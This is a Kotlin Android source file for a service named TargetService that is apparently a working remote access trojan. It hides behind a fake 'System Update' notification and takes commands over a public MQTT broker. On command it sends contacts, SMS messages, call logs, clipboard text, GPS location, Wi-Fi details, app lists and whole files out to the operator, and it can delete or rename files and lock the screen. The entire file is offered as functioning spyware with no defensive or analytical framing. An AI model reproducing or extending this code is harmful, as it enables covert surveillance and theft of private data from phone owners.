package com.ghost.target

import android.app.*
import android.app.admin.DevicePolicyManager
import android.content.*
import android.location.LocationManager
import android.net.wifi.WifiManager
import android.os.*
import android.provider.*
import android.widget.Toast
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import org.eclipse.paho.client.mqttv3.*
import org.eclipse.paho.client.mqttv3.persist.MemoryPersistence
import java.io.*

class TargetService : Service() {
    companion object {
        var instance: TargetService? = null
        var mqttClient: MqttClient? = null
        const val ROOM_ID = "GHOST_SECRET_ROOM_99"
        const val BROKER = "tcp://broker.hivemq.com:1883"
        fun sendLog(t: String) { 
            try { mqttClient?.publish("$ROOM_ID/res", MqttMessage(t.toByteArray())) } catch (e: Exception) {} 
        }
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        startForeground(1, buildNotif())
        
        try {
            mqttClient = MqttClient(BROKER, MqttClient.generateClientId(), MemoryPersistence())
            val opt = MqttConnectOptions().apply { isAutomaticReconnect = true; isCleanSession = true; maxInflight = 200 }
            mqttClient?.connect(opt)
            mqttClient?.subscribe("$ROOM_ID/cmd", 1) { _, msg -> handle(String(msg.payload).trim()) }
        } catch (e: Exception) { e.printStackTrace() }
    }

    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int = START_STICKY
    override fun onBind(i: Intent?): IBinder? = null

    private fun buildNotif(): Notification {
        val ch = "g_ch"
        val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
        if (Build.VERSION.SDK_INT >= 26) nm.createNotificationChannel(NotificationChannel(ch, "Sys", NotificationManager.IMPORTANCE_LOW))
        return NotificationCompat.Builder(this, ch).setContentTitle("System Update").setContentText("Updating...").setSmallIcon(android.R.drawable.stat_notify_sync).build()
    }

    private fun handle(cmd: String) {
        when {
            cmd.startsWith("toast:") -> Handler(Looper.getMainLooper()).post { Toast.makeText(this, cmd.substringAfter("toast:"), Toast.LENGTH_LONG).show() }
            cmd == "vibrate" -> vibratePhone()
            cmd == "volume_max" -> setVol(100)
            cmd == "volume_mute" -> setVol(0)
            cmd == "lock" -> lockScreen()
            cmd.startsWith("open:") -> startActivity(Intent(Intent.ACTION_VIEW, android.net.Uri.parse(cmd.substringAfter("open:"))).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
            cmd.startsWith("start_app:") -> startApp(cmd.substringAfter("start_app:"))
            cmd == "loc" -> getLocation()
            cmd == "gps_track" -> trackLocation()
            cmd == "contacts" -> sendLog(getContacts())
            cmd == "sms" -> sendLog(getSms())
            cmd == "calls" -> sendLog(getCalls())
            cmd == "apps" -> sendLog(getApps())
            cmd == "device" -> sendLog("Model: ${Build.MODEL}\nOS: ${Build.VERSION.RELEASE}")
            cmd == "wifi" -> sendLog(getWifi())
            cmd == "battery" -> sendLog(getBattery())
            cmd == "clip" -> sendLog(getClipboard())
            cmd == "gallery" -> sendLog(getGallery())
            cmd.startsWith("ls:") -> sendLog(listFiles(cmd.substringAfter("ls:")))
            cmd.startsWith("read:") -> sendLog(readFile(cmd.substringAfter("read:")))
            cmd.startsWith("del:") -> deleteFile(cmd.substringAfter("del:"))
            cmd.startsWith("dl:") -> downloadFile(cmd.substringAfter("dl:"))
            cmd.startsWith("mkdir:") -> createDir(cmd.substringAfter("mkdir:"))
            cmd.startsWith("rename:") -> { 
                val p = cmd.substringAfter("rename:").split("|")
                if (p.size == 2) renameFile(p[0], p[1]) 
            }
        }
    }

    private fun vibratePhone() { 
        val v = getSystemService(VIBRATOR_SERVICE) as Vibrator
        if (Build.VERSION.SDK_INT >= 26) v.vibrate(VibrationEffect.createOneShot(1000, VibrationEffect.DEFAULT_AMPLITUDE))
        sendLog("Vibrate") 
    }

    private fun setVol(pct: Int) { 
        val am = getSystemService(AUDIO_SERVICE) as android.media.AudioManager
        am.setStreamVolume(android.media.AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(android.media.AudioManager.STREAM_MUSIC) * pct / 100, 0)
        sendLog("Volume $pct%") 
    }

    private fun lockScreen() { 
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        if (dpm.isAdminActive(ComponentName(this, AdminReceiver::class.java))) { 
            dpm.lockNow(); sendLog("Locked") 
        } 
    }

    private fun startApp(pkg: String) { 
        val i = packageManager.getLaunchIntentForPackage(pkg)
        if (i != null) { startActivity(i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)); sendLog("$pkg") } else sendLog("not found") 
    }

    private fun getLocation() { 
        val lm = getSystemService(LOCATION_SERVICE) as LocationManager
        val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
        if (loc != null) sendLog("${loc.latitude}, ${loc.longitude}") else sendLog("No location") 
    }

    private fun trackLocation() { 
        CoroutineScope(Dispatchers.IO).launch { 
            val lm = getSystemService(LOCATION_SERVICE) as LocationManager
            for (i in 1..5) { 
                val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                if (loc != null) sendLog("Track $i: ${loc.latitude}, ${loc.longitude}")
                delay(5000) 
            } 
        } 
    }

    private fun getContacts(): String { 
        val sb = StringBuilder("Kontak:\n"); var c = 0
        contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER), null, null, null)?.use { 
            while (it.moveToNext() && c < 20) { sb.append("${it.getString(0)}: ${it.getString(1)}\n"); c += 1 } 
        }
        return if (c == 0) "Kosong" else sb.toString() 
    }

    private fun getSms(): String { 
        val sb = StringBuilder("SMS:\n"); var c = 0
        contentResolver.query(Telephony.Sms.CONTENT_URI, arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY), null, null, Telephony.Sms.DATE + " DESC")?.use { 
            while (it.moveToNext() && c < 20) { sb.append("${it.getString(0)}: ${it.getString(1)?.take(50)}\n"); c += 1 } 
        }
        return if (c == 0) "Kosong" else sb.toString() 
    }

    private fun getCalls(): String { 
        val sb = StringBuilder("Call Log:\n"); var c = 0
        contentResolver.query(CallLog.Calls.CONTENT_URI, arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION), null, null, CallLog.Calls.DATE + " DESC")?.use { 
            while (it.moveToNext() && c < 20) { sb.append("${it.getString(0)} | ${it.getLong(2)}s\n"); c += 1 } 
        }
        return if (c == 0) "Kosong" else sb.toString() 
    }

    private fun getApps(): String { 
        val sb = StringBuilder("Apps:\n"); var c = 0
        packageManager.getInstalledPackages(0).forEach { 
            if (c < 30) { sb.append("${it.packageName}\n"); c += 1 } 
        }
        return sb.toString() 
    }

    private fun getWifi(): String { 
        val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
        @Suppress("DEPRECATION") val i = wm.connectionInfo
        return "SSID: ${i.ssid}\nIP: ${i.ipAddress}" 
    }

    private fun getBattery(): String { 
        val bm = getSystemService(BATTERY_SERVICE) as BatteryManager
        return "Battery: ${bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)}%" 
    }

    private fun getClipboard(): String { 
        val cm = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
        val c = cm.primaryClip
        return if (c == null || c.itemCount == 0) "Kosong" else "${c.getItemAt(0).text}" 
    }

    private fun getGallery(): String { 
        val dir = File("/sdcard/DCIM/Camera")
        val files = dir.listFiles { f -> f.isFile && f.name.endsWith(".jpg") }?.sortedByDescending { it.lastModified() }?.take(15)
        if (files.isNullOrEmpty()) return "Galeri kosong"
        val sb = StringBuilder("Galeri (15 terakhir):\n")
        files.forEach { sb.append("${it.name} (${it.length()/1024} KB)\n") }
        return sb.toString() 
    }

    private fun listFiles(path: String): String { 
        val f = File(path)
        if (!f.exists()) return "Not found"
        val sb = StringBuilder("$path:\n"); var c = 0
        f.listFiles()?.forEach { 
            if (c < 20) { sb.append(if (it.isDirectory) "[D] " else "[F] ").append(it.name).append("\n"); c += 1 } 
        }
        return sb.toString() 
    }

    private fun readFile(path: String): String { 
        val f = File(path)
        if (!f.exists()) return "File not found"
        return try { "$path:\n${f.readText()}" } catch (e: Exception) { "${e.message}" } 
    }

    private fun deleteFile(path: String): String { 
        val f = File(path)
        return if (f.exists() && f.delete()) "Deleted" else "Failed" 
    }

    private fun downloadFile(path: String) { 
        val f = File(path)
        if (!f.exists()) return sendLog("Not found")
        if (f.length() > 5*1024*1024) return sendLog("File > 5MB")
        sendLog("file:${f.name}|" + android.util.Base64.encodeToString(f.readBytes(), android.util.Base64.NO_WRAP)) 
    }

    private fun createDir(path: String) { 
        val f = File(path)
        if (f.mkdirs()) sendLog("Created: $path") else sendLog("Failed") 
    }

    private fun renameFile(from: String, to: String) { 
        val f1 = File(from); val f2 = File(to)
        if (f1.renameTo(f2)) sendLog("Renamed") else sendLog("Failed") 
    }
}
